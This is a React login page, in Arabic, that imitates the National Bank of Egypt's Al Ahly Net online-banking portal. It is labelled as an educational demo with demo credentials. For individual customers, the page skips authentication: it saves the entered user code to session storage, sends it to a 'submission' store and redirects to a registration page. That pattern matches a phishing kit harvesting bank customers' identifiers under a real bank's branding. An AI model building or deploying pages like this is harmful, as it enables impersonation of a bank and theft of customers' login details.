import React, { useState } from "react";
import { useNavigate, Link } from "react-router-dom";
import {
  Eye, EyeOff, User, Users, Pencil, BarChart3, Info,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useToast } from "@/components/ui/use-toast";
import DemoBanner from "@/components/bank/DemoBanner";
import PortalLogo from "@/components/bank/PortalLogo";
import PortalBottomNav from "@/components/bank/PortalBottomNav";
import { DEMO_CREDS, PRIVACY_NOTE } from "@/lib/bankData";
import { upsertSubmission } from "@/lib/portalSession";

const GREEN = "#1B5E20";
const BTN = "#396E49";

export default function BankLogin() {
  const navigate = useNavigate();
  const { toast } = useToast();
  const [tab, setTab] = useState("individuals");
  const [step, setStep] = useState(1);
  const [username, setUsername] = useState("");
  const [companyId, setCompanyId] = useState("");
  const [password, setPassword] = useState("");
  const [show, setShow] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const toStep2 = (e) => {
    e?.preventDefault();
    if (tab === "companies" && !companyId.trim()) {
      setError("من فضلك أدخل هوية الشركة.");
      return;
    }
    if (!username.trim()) {
      setError("من فضلك أدخل كود المستخدم.");
      return;
    }
    setError("");
    if (tab === "individuals") {
      sessionStorage.setItem("portal_user_code", username.trim());
      upsertSubmission({ user_code: username.trim() });
      navigate("/register");
      return;
    }
    setStep(2);
  };

  const backToStep1 = () => {
    setStep(1);
    setPassword("");
    setError("");
  };

  const submit = (e) => {
    e.preventDefault();
    setError("");
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      if (username.trim() === DEMO_CREDS.username && password === DEMO_CREDS.password) {
        sessionStorage.setItem("demo_session", username.trim());
        sessionStorage.setItem("portal_return", "1");
        toast({ title: "تم تسجيل الدخول" });
        navigate("/apply");
      } else {
        setError("بيانات غير صحيحة. كود المستخدم: demo وكلمة المرور: demo123");
      }
    }, 700);
  };

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <DemoBanner />
      <div className="flex-1 flex items-start justify-center px-4 py-8">
        <div className="w-full max-w-md space-y-6">
          <div className="flex justify-center pt-2">
            <PortalLogo />
          </div>

          {step === 1 ? (
            <div className="space-y-5">
              <div className="text-center space-y-1">
                <h1 className="text-lg font-bold text-slate-900">مرحباً بك في الاهلي نت</h1>
                <p className="text-sm text-slate-500">من فضلك سجل الدخول باسم المستخدم</p>
              </div>

              {/* Toggle */}
              <div className="grid grid-cols-2 rounded-xl bg-[#F2F2F2] p-1">
                {[
                  { id: "individuals", label: "افراد", icon: User },
                  { id: "companies", label: "شركات", icon: Users },
                ].map((t) => (
                  <button
                    key={t.id}
                    type="button"
                    onClick={() => setTab(t.id)}
                    className={`flex items-center justify-center gap-2 py-2.5 rounded-lg text-sm font-medium transition-all ${
                      tab === t.id ? "bg-[#4A4A4A] text-white shadow-sm" : "text-slate-500"
                    }`}
                  >
                    <t.icon className="w-4 h-4" />
                    {t.label}
                  </button>
                ))}
              </div>

              <form onSubmit={toStep2} className="space-y-4">
                {tab === "companies" && (
                  <Input
                    placeholder="هوية الشركة"
                    className="rounded-xl border-slate-200 py-6 text-center"
                    value={companyId}
                    onChange={(e) => setCompanyId(e.target.value)}
                  />
                )}
                <Input
                  placeholder="كود المستخدم"
                  className="rounded-xl border-slate-200 py-6 text-center"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                />
                {error && <p className="text-sm text-red-600 text-center">{error}</p>}
                <div className="text-center">
                  <button
                    type="button"
                    onClick={() => toast({ title: "استعادة كود المستخدم", description: "غير مفعّلة — نظام محاكاة تعليمي." })}
                    className="text-sm text-[#1B5E20] hover:underline"
                  >
                    نسيت كود المستخدم
                  </button>
                </div>
                <Button
                  type="submit"
                  className="w-full text-white rounded-xl py-6 text-base"
                  style={{ backgroundColor: BTN }}
                >
                  تسجيل الدخول
                </Button>
              </form>

              <div className="text-center space-y-1">
                <Link to="/apply" className="text-[#1B5E20] font-bold hover:underline">سجل الان</Link>
                <p className="text-xs text-slate-400">انضم لعملاء البنك الاهلي المصري</p>
              </div>
            </div>
          ) : (
            <div className="space-y-5">
              {/* User ID container */}
              <div className="flex items-center justify-between gap-3 rounded-xl border border-slate-200 bg-[#E8F5E9] p-4">
                <div className="flex items-center gap-3">
                  <span className="w-10 h-10 rounded-full bg-slate-200 flex items-center justify-center text-slate-500">
                    <User className="w-5 h-5" />
                  </span>
                  <div className="leading-tight">
                    <div className="text-sm font-bold text-slate-800">كود المستخدم</div>
                    <div className="text-sm text-slate-600" dir="ltr">{username}</div>
                  </div>
                </div>
                <button
                  type="button"
                  onClick={backToStep1}
                  className="flex items-center gap-1 text-sm text-[#1B5E20] hover:underline"
                >
                  تغيير
                  <Pencil className="w-3.5 h-3.5" />
                </button>
              </div>

              <form onSubmit={submit} className="space-y-4">
                <div className="relative">
                  <Input
                    type={show ? "text" : "password"}
                    placeholder="كلمة المرور"
                    className="rounded-xl border-slate-200 py-6 pl-12"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                  />
                  <button
                    type="button"
                    onClick={() => setShow(!show)}
                    className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600"
                  >
                    {show ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                  </button>
                </div>

                {error && <p className="text-sm text-red-600 text-center">{error}</p>}

                <div className="text-center">
                  <button
                    type="button"
                    onClick={() => toast({ title: "استعادة كلمة المرور", description: "غير مفعّلة — نظام محاكاة تعليمي." })}
                    className="text-sm text-[#1B5E20] hover:underline"
                  >
                    نسيت كلمة المرور؟
                  </button>
                </div>

                <div className="flex gap-2">
                  <Button
                    type="submit"
                    disabled={loading}
                    className="flex-1 text-white rounded-xl py-6 text-base"
                    style={{ backgroundColor: BTN }}
                  >
                    {loading ? "جاري التحقق..." : "تسجيل الدخول"}
                  </Button>
                  <button
                    type="button"
                    onClick={() => toast({ title: "حاسبة الأقساط", description: "غير مفعّلة — نظام محاكاة تعليمي." })}
                    className="w-12 shrink-0 rounded-xl border border-slate-200 bg-white flex items-center justify-center text-[#1B5E20] hover:bg-slate-50"
                  >
                    <BarChart3 className="w-5 h-5" />
                  </button>
                </div>
              </form>
            </div>
          )}

          <PortalBottomNav />

          <div className="flex items-start gap-2 rounded-xl bg-[#1B5E20]/5 border border-[#1B5E20]/15 p-3 text-xs text-[#1B5E20]">
            <Info className="w-4 h-4 shrink-0 mt-0.5" />
            <span>{PRIVACY_NOTE}</span>
          </div>

          <div className="text-center text-xs text-slate-400">
            <Link to="/" className="text-slate-500 hover:underline">العودة للرئيسية</Link>
          </div>
        </div>
      </div>
    </div>
  );
}